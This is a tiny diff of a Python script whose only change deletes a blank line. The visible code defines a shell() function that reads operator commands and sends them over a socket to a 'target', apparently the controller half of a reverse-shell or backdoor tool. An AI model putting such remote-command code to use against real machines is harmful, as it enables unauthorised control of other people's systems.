@@ -1,7 +1,6 @@
 import socket
 import subprocess
 
-
 def shell():
   command=input("Command: %s" %str(ip))
   target.send(command)
